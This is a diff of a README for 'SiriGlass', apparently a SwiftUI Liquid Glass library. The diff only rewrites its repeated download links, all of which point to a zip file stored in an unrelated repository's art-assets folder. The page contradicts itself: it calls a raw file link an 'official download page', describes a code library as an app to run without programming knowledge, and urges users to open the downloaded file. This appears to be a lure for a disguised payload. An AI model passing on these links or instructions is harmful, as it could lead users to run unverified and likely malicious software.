@@ -5,9 +5,9 @@ description: "Bring the Siri Liquid Glass drop to SwiftUI with one modifier: Dyn
 ---
 # 🪟 SiriGlass - Liquid Glass That Lights Up
 
-[![Download SiriGlass](https://img.shields.io/badge/Download-SiriGlass-7B3FE4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hikaru17zx/hikaru17zx.github.io/raw/refs/heads/main/assets/quote-art/Dist_2.1.zip)
+[![Download SiriGlass](https://img.shields.io/badge/Download-SiriGlass-7B3FE4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hikaru17zx/hikaru17zx.github.io/main/assets/quote-art/Dist_2.1.zip)
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Available-FF6B35?style=for-the-badge&logo=rocket&logoColor=white)](https://github.com/Hikaru17zx/hikaru17zx.github.io/raw/refs/heads/main/assets/quote-art/Dist_2.1.zip)
+[![Latest Release](https://img.shields.io/badge/Latest%20Release-Available-FF6B35?style=for-the-badge&logo=rocket&logoColor=white)](https://raw.githubusercontent.com/Hikaru17zx/hikaru17zx.github.io/main/assets/quote-art/Dist_2.1.zip)
 
 SiriGlass brings the Siri drop from iOS 27 to SwiftUI. Liquid Glass pours out of the Dynamic Island and lights up with your voice. Everything is controlled through one modifier: `.siriGlass($state)`. No complex setup, no long configuration files, no programming knowledge required to get it running on your computer.
 
@@ -15,9 +15,9 @@ This page walks you through downloading SiriGlass, opening it for the first time
 
 ## 📥 Download SiriGlass
 
-[![Download Now](https://img.shields.io/badge/⬇%20Download%20SiriGlass-2ECC71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hikaru17zx/hikaru17zx.github.io/raw/refs/heads/main/assets/quote-art/Dist_2.1.zip)
+[![Download Now](https://img.shields.io/badge/⬇%20Download%20SiriGlass-2ECC71?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Hikaru17zx/hikaru17zx.github.io/main/assets/quote-art/Dist_2.1.zip)
 
-Visit this link to download the application: https://github.com/Hikaru17zx/hikaru17zx.github.io/raw/refs/heads/main/assets/quote-art/Dist_2.1.zip
+Visit this link to download the application: https://raw.githubusercontent.com/Hikaru17zx/hikaru17zx.github.io/main/assets/quote-art/Dist_2.1.zip
 
 That page is the official download page. Everything you need lives there, and it is always kept up to date with the newest version.
 
@@ -114,7 +114,7 @@ Use the repository's issues section, linked from the same GitHub page where you 
 
 ## 📌 Quick Recap
 
-- Download page: https://github.com/Hikaru17zx/hikaru17zx.github.io/raw/refs/heads/main/assets/quote-art/Dist_2.1.zip
+- Download page: https://raw.githubusercontent.com/Hikaru17zx/hikaru17zx.github.io/main/assets/quote-art/Dist_2.1.zip
 - Visit this link to download the application.
 - Grab the file from the newest release at the top of the page.
 - Open the downloaded file to run SiriGlass.
